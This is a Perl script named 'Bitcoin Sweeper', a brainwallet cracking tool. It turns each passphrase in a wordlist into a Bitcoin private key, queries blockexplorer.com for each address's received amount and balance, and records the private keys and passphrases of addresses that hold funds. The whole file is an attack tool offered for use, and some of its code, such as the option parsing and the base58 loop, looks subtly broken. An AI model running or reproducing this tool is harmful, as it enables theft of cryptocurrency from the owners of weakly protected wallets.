#!/usr/bin/perl

use strict;
use warnings;

use bigrat;
use Digest::SHA;
use Getopt::Long;
use WWW::Mechanize;
use HTML::TreeBuilder;
use Finance::Bitcoin::API;
use Parallel::ForkManager 0.7.6;

  # Change to your blockchain account login and pass
  my $blockchain_username = "";
  my $blockchain_password = "";

  # Blockchain RPC API
  my $rpchost = "rpc.blockchain.info";
  my $rpcport = "80";

  my $i             = 0;  # Number of current line
  my $nlines        = 0;  # Number of lines in wordlist file
  my $cracked       = 0;  # Number of wallets with balance > 0
  my $transactions  = 0;  # Number of wallets with transtactions > 0
  my $totalbalance  = 0;  # Total balance from addresses
  my $totalreceived = 0;  # Total received by addresses

  my %storage;

  # Command line options
  my $help;
  my $version;
  my $version_num = 'version 0.1 Alpha';
  my $opt_output;
  my $opt_threads;
  my $opt_wordlist;

  my $backup = "0";

  my $options = GetOptions(
    "help"    => \$help,          # Help message
    "version" => \$version,       # Print current version (above)
    "w"       => \$opt_wordlist,  # Path to wordlist file
    "t"       => \$opt_threads,   # Number of threads (CPU)
    "o"       => \$opt_output     # Name of output file
  );

  my ( $target, $threads, $result ) = @ARGV;

  help() if $help;
  quit($version_num) if $version;

  show_header();
  start_attack();

  if ( $backup eq "1" ) {       # Check if output file is specified
    print "[i] Saving to: ".$result."\n";
    print "[i] Writing output ...\n";

    foreach my $add (sort keys %storage) {
      foreach my $subject (keys %{ $storage{$add} }) {
        backup($result, "$add, $subject: $storage{$add}{$subject}\n");
      }
    }
  }
  else {
    foreach my $add (sort keys %storage) {
      foreach my $subject (keys %{ $storage{$add} }) {
        print "$add, $subject: $storage{$add}{$subject}\n";
      }
    }
  }

  print "\n[x] Done.\n\n";

  # FUNCTIONS

sub start_attack {

  if ( not defined( $opt_wordlist and $opt_threads ) ) {
    # Usage: perl $0 -w pass.txt -t 10 -o output.txt
    die "Usage: perl $0 -w pass.txt -t 10 -o output.txt\n\n";
  }

  open (F, $target) || die "Could not open $ARGV[0]: $!\n";
  my @f = <F>;
  close F;
  $nlines = @f; # Number of lines in file

  if ( defined( $opt_output and $result ) ) {
    $backup = "1";  # Output to file $result
  }

  if ( defined( $opt_wordlist and $target ) ) {
    my $pm = Parallel::ForkManager->new($threads);

    # data structure retrieval and handling
    $pm -> run_on_finish ( # called BEFORE the first call to start()
      sub {
        my ($pid, $exit_code, $ident, $exit_signal, $core_dump, $data) = @_;

        # retrieve data structure from child
        if (defined($data)) {  # children are not forced to send anything
          my $getreceived = $data->[0];  # child passed a string reference
          my $balance     = $data->[1]."\n";
          my $btcaddress  = $data->[2];
          my $private     = $data->[3];
          my $passphrase  = $data->[4];
          $i++;
        
          if ( $getreceived > 0) {
            $transactions++;
            $storage{$btcaddress}{Balance}    = $balance;
            $storage{$btcaddress}{Received}   = $getreceived;
            $storage{$btcaddress}{PrivateKey} = $private;
            $storage{$btcaddress}{Passphrase} = $passphrase;
          }

          if ( $balance > 0) {
            $cracked++;
          }

          $totalreceived = $totalreceived + $getreceived;
          $totalbalance = $totalbalance + $balance;

          system("clear");
          show_header();
          print "[i] Generating Private Keys.\n";
          print "[i] Checking transactions.\n";
          print "[i] Please wait ...\n\n";
          print "[i] Processing: ".$i."/".scalar $nlines."\n";

          print "[i] Wallets with transactions: ".$transactions."\n";
          print "[i] Total received: ".$totalreceived." BTC\n\n";

          print "[i] Wallets with balance: ".$cracked."\n";
          print "[i] Total balance: ".$totalbalance." BTC\n";
        }
        else {  # problems occuring during storage or retrieval will throw a warning
          print qq|No message received from child process $pid!\n|;
        }
      }
    );

    # run the parallel processes
    PASSPRASES:
    foreach my $passphrase (@f) {
      $pm->start() and next PASSPRASES;

      chomp($passphrase);
      my $private     = base58_PrivKey( $passphrase );  # Get private key in base58 from passphrase
      my $btcaddress  = PrivateToAddress( $private );   # Get bitcoin address from private key
      chomp($btcaddress);

      my $mech = WWW::Mechanize->new();
      $mech->get("http://blockexplorer.com/q/getreceivedbyaddress/".$btcaddress);   # Check transactions on bitcoin address
      my $getreceived = $mech->content;

      $mech->get("http://blockexplorer.com/q/addressbalance/".$btcaddress);   # Check balance on bitcoin address
      my $addressbalance = $mech->content;

      # send it back to the parent process
      $pm->finish(0, [ $getreceived, $addressbalance, $btcaddress, $private, $passphrase ]);  # note that it's a scalar REFERENCE, not the scalar itself
    }

    $pm->wait_all_children;

  }
}

sub base58_PrivKey {

  my ( $word ) = @_;
  my $sha = Digest::SHA->new(256);
  $sha->add($word);

  my $hex = $sha->hexdigest;
  my $hex2 = "80$hex";
  my $hex3 = pack 'H*', $hex2;

  $sha = Digest::SHA->new(256);
  $sha->add($hex3);

  my $digest = $sha->digest;
  $sha = Digest::SHA->new(256);
  $sha->add($digest);

  my $hex5 = $sha->hexdigest;
  $hex5 = substr $hex5, 0, 8;
  my $hexchecksum = "$hex2$hex5";

  my $out = '';
  my @base58 = (1 .. 9, 'A' .. 'H', 'J' .. 'N', 'P' .. 'Z', 'a' .. 'k', 'm' .. 'z');
  my $n = hex($hexchecksum);

  while ($n > 1) {
    my $remain = $n % 58;
    $out = $base58[$remain] . $out;
    $n /= 58;
  }
    return $out;
}

sub PrivateToAddress {

  my ( $private ) = @_;
  my $btcaddress  = `echo -n $private | python keyfmt.py %a`;
  return $btcaddress;
}

sub show_header {

    print <<EndHead;
      ___  _ ___ ____ ____ _ _  _ 
      |__] |  |  |    |  | | |\\ |
      |__] |  |  |___ |__| | | \\|          
  ____ _ _ _ ____ ____ ___  ____ ____
  [__  | | | |___ |___ |__] |___ |__/
  ___] |_|_| |___ |___ |    |___ |  \\

EndHead
}

sub backup {
  my ( $result, $log )    = @_;
  open( my $fh, ">>", "$result" ) or die "$result: $!";
  print $fh "$log";
  close($fh);
}

sub help {
    print <<EOHELP;
btc_sweeper.pl at https://github.com/vavkamil/Bitcoin-Sweeper
Usage: perl btc_sweeper.pl -w pass.txt -t 10 -o output.txt
Overview:
    BITCOIN Sweeper is simple tool written in Perl.
    It could be used to generate bitcoin private keys from passphrases
    and check transtactions/balance.
Options:
    -w          Wordlist path.
    -t          Threads (CPU)
    -o          Output file.
    -version    Print current version.
    -help       This help message.
EOHELP
    exit;
}

sub quit {
    my ($text) = @_;
    print "$text\n\n";
    exit;
}
